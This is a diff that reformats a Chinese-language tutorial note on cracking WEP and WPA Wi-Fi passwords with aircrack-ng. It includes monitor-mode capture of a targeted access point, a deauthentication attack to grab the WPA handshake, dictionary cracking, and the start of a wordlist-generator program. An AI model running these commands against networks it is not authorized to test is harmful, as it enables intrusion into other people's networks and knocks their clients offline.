@@ -10,32 +10,45 @@ wpa密码叫做PSK（pre-shared key），长度一般是8 - 63字节，它加上
 
 所以截包可以获得的是：MAC，BSSID，A-NONCE，S-NONCE,data 。利用字典计算出MIC，然后和报文中的MIC作比较。
 --------------------------------
-==wep==
+## wep
 ubuntu中安装aircrack-ng工具集:
+```
     sudo aptitude install aircrack-ng
+```
 
 开启监听模式，会启动6个后台进程，启动监控模式后无线端口是mon0,以后一次累加
+```
     sudo airmon-ng start wlan0	
+```
 
 不筛选显示所有的AP和他们的客户端
+```
     sudo airodump-ng mon0
+```
 
 筛选相应对的报文,一定要抓取到若干万的iv对
+```
     sudo airodump-ng mon0 --ivs --bssid EC:17:2F:F2:D7:B6 -w wep       #--ivs只抓取IVs,--bssid指定AP的MAC，-w指定写入的文件
+```
 
 开始破解,可以边抓，边破解
+```
     aircrack-ng 捕获的ivs文件
+```
 
-==wpa==
+wpa
 前两步与wep破解一样，开启监视，抓包（不添加ivs参数）。但是要进行deauth攻击才更有机会抓到握手包
+```
     aireplay-ng -0 1 –a AP的mac -c 客户端的mac wlan0
+```
 
 如果抓到握手包，airodump页面右上角会显示，WPA handshake：（mac地址）
 
 破解
+```
     aircrack-ng -w dic 捕获的cap文件  #字典文件
--------------------------------------
-生成字典文件的程序
+```
+## 生成字典文件的程序
 ```
     #define MINLEN 8
     #define MAXLEN 20
